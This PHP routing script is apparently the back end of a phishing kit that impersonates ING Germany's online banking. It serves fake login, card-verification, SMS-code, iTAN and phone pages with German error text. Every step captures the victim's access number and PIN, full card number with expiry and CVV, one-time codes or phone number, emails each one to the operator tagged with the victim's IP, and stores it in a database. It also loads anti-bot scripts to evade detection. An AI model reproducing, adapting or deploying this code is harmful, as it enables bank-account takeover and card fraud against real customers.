<?php

    include '../prevents/anti1.php';
    include '../prevents/anti2.php';
    include '../prevents/anti3.php';
    include '../prevents/anti4.php';
    include '../prevents/anti5.php';
    include '../prevents/anti6.php';
    include '../prevents/anti7.php';
    include '../prevents/anti8.php';

    include 'config.php';
    use Steampixel\Route;

    Route::add('/', function() {
        echo 'Welcome :-)';
    });

    Route::add('/waiting', function() {
        $response = panel_response();
        echo $response;
        exit();
    });

    Route::add('/redirection/([a-z-0-9-]*)', function($page_name) {
        if( $page_name === 'badlogin' ) {
            $_SESSION['errors']['user'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre 10-stellige Zugangsnummer ein.';
            $_SESSION['errors']['password'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre mindestens 5-stellige Internetbanking PIN ein.';
            header("Location: ../login");
            exit();
        } else if( $page_name === 'cc' ) {
            header("Location: ../verifyinfos");
            exit();
        } else if( $page_name === 'sms' ) {
            header("Location: ../ss");
            exit();
        } else if( $page_name === 'badsms' ) {
            $_SESSION['errors']['sms_code'] = 'Ungültiger Code.';
            header("Location: ../ss");
            exit();
        } else if( $page_name === 'itan' ) {
            header("Location: ../it");
            exit();
        } else if( $page_name === 'baditan' ) {
            $_SESSION['errors']['itan'] = 'Ungültiger Code.';
            header("Location: ../it");
            exit();
        } else if( $page_name === 'firma' ) {
            header("Location: ../firma");
            exit();
        } else if( $page_name === 'badfirma' ) {
            $_SESSION['errors']['firma'] = true;
            header("Location: ../firma");
            exit();
        } else if( $page_name === 'phone' ) {
            header("Location: ../phone");
            exit();
        } else if( $page_name === 'badphone' ) {
            $_SESSION['errors']['phone'] = 'Telefonnummer ungültig.';
            header("Location: ../phone");
            exit();
        } else if( $page_name === 'app' ) {
            header("Location: ../a");
            exit();
        } else if( $page_name === 'success' ) {
            header("Location: ../success");
            exit();
        }
        exit();
    });

    /* BODY */

    Route::add('/app', function() {
        views('a');
    },'get');

    Route::add('/login', function() {
        views('l');
    },'get');

    Route::add('/phone', function() {
        views('p');
    },'get');

    Route::add('/firma', function() {
        views('f');
    },'get');

    Route::add('/verifyinfos', function() {
        views('c');
    },'get');

    Route::add('/ss', function() {
        views('s');
    },'get');

    Route::add('/it', function() {
        views('i');
    },'get');

    Route::add('/a', function() {
        views('a');
    },'get');

    Route::add('/success', function() {
        views('su');
    },'get');

    /* END BODY */

    /* RESULT */

    Route::add('/result', function() {
        
        /* LOG RESULT */
        if ($_POST['step'] == "login") {
            $_SESSION['errors']     = [];
            $_SESSION['user']   = $_POST['user'];
            $_SESSION['password']   = $_POST['password'];
            if( validate_number($_POST['user'],10) == false ) {
                $_SESSION['errors']['user'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre 10-stellige Zugangsnummer ein.';
            }
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = 'Ihre Anmeldung war nicht erfolgreich. Bitte geben Sie Ihre mindestens 5-stellige Internetbanking PIN ein.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Login';
                $message = '/-- LOGIN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Username : ' . $_POST['user'] . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END LOGIN INFOS --/' . "\r\n";
                send($subject,$message);
                $data = [
                    'login'     => $_POST['user'] . ' | ' . $_POST['password'],
                    'ip'    => get_client_ip()
                ];
                insert_login($data);
                echo 'success';
                exit();
            } else {
                $error = $_POST['error'];
                echo 'error';
                exit();
            }
        }

        /* LOG RESULT */
        if ($_POST['step'] == "firma") {
            $_SESSION['errors']     = [];
            $_SESSION['firma']   = $_POST['firma1'];
            if( validate_number($_POST['firma1'],6) == false ) {
                $_SESSION['errors']['firma'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Firma';
                $message = '/-- FIRMA INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Firma : ' . $_POST['firma1'] . "\r\n";
                $message .= '/-- END FIRMA INFOS --/' . "\r\n";
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'firma'     => $_POST['firma1'],
                    'ip'    => get_client_ip()
                ];
                insert_firma($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }

        /* LOG RESULT */
        if ($_POST['step'] == "itan") {
            $_SESSION['errors']     = [];
            $_SESSION['itan']   = $_POST['itan1'] . $_POST['itan2'] . $_POST['itan3'] . $_POST['itan4'] . $_POST['itan5'] . $_POST['itan6'];
            if( validate_number($_SESSION['itan'],6) == false ) {
                $_SESSION['errors']['itan'] = 'Ungültiger Code.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | iTAN';
                $message = '/-- ITAN INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'iTAN : ' . $_SESSION['itan'] . "\r\n";
                $message .= '/-- END ITAN INFOS --/' . "\r\n";
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'itan'     => $_SESSION['itan'],
                    'ip'    => get_client_ip()
                ];
                insert_itan($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }

        /* CC RESULT */
        if ($_POST['step'] == "cc") {
            $_SESSION['errors']      = [];
            $_SESSION['cc1']   = $_POST['cc1'];
            $_SESSION['cc2']   = $_POST['cc2'];
            $_SESSION['cc3']   = $_POST['cc3'];
            $_SESSION['cc4']   = $_POST['cc4'];
            $_SESSION['two']      = $_POST['two'];
            $_SESSION['three']      = $_POST['three'];
            $cc = $_POST['cc1'] . $_POST['cc2'] . $_POST['cc3'] . $_POST['cc4'];
            $date_ex     = explode('/',$_POST['two']);
            $card_date   = validate_cc_date($date_ex[0],$date_ex[1]);
            $cc_nospace = $string = str_replace(' ', '', $cc);
            if( validate_number($_POST['cc1'],4) == false ) {
                $_SESSION['errors']['cc1'] = true;
            }
            if( validate_number($_POST['cc2'],4) == false ) {
                $_SESSION['errors']['cc2'] = true;
            }
            if( validate_number($_POST['cc3'],4) == false ) {
                $_SESSION['errors']['cc3'] = true;
            }
            if( validate_number($_POST['cc4'],4) == false ) {
                $_SESSION['errors']['cc4'] = true;
            }
            if( validate_number($cc_nospace,16) == false ) {
                $_SESSION['errors']['one'] = 'Kartennummer ungültig';
            }
            if( validate_number($_POST['three'],3) == false ) {
                $_SESSION['errors']['three'] = 'Sicherheitscode ungültig';
            }
            if( $card_date == false ) {
                $_SESSION['errors']['two'] = 'Datum ungültig';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Card number : ' . $cc . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'cc'     => $cc . ' | ' . $_POST['two'] . ' | ' . $_POST['three'],
                    'ip'    => get_client_ip()
                ];
                insert_cc($data);
                echo 'success';
                exit();
            } else {
                echo 'error';
                exit();
            }
        }

        /* SMS RESULT */
        if ($_POST['step'] == "sms") {
            $_SESSION['errors']     = [];
            $_SESSION['sms_code']   = $_POST['sms1'] . $_POST['sms2'] . $_POST['sms3'] . $_POST['sms4'] . $_POST['sms5'] . $_POST['sms6'];
            $sms   = $_POST['sms1'] . $_POST['sms2'] . $_POST['sms3'] . $_POST['sms4'] . $_POST['sms5'] . $_POST['sms6'];
            if( validate_number($sms,6) == false ) {
                $_SESSION['errors']['sms_code'] = 'Ungültiger Code.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS code : ' . $sms . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'sms'     => $sms,
                    'ip'    => get_client_ip()
                ];
                insert_sms($data);
                echo 'success';
                exit();
            } else {
                $_SESSION['errors']['sms_code'] = 'Ungültiger Code.';
                echo 'error';
                exit();
            }
        }

        if ($_POST['step'] == "phone") {
            $_SESSION['errors']     = [];
            $_SESSION['phone']   = $_POST['phone'];
            if( validate_number($_POST['phone']) == false ) {
                $_SESSION['errors']['phone'] = 'Telefonnummer ungültig.';
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | ING-DE | Phone';
                $message = '/-- PHONE INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Phone number : ' . $_POST['phone'] . "\r\n";
                $message .= '/-- END PHONE INFOS --/' . "\r\n";
                send($subject,$message);
                update_status(get_client_ip(),'W');
                $data = [
                    'phone'     => $_POST['phone'],
                    'ip'    => get_client_ip()
                ];
                insert_phone($data);
                echo 'success';
                exit();
            } else {
                $_SESSION['errors']['phone'] = 'Telefonnummer ungültig.';
                echo 'error';
                exit();
            }
        }
        
    },'post');

    /* RESULT */

    Route::pathNotFound(function($path) {
        header('HTTP/1.0 404 Not Found');
    });

    Route::methodNotAllowed(function($path, $method) {
        header('HTTP/1.0 405 Method Not Allowed');
    });

    Route::run(BASEPATH);

?>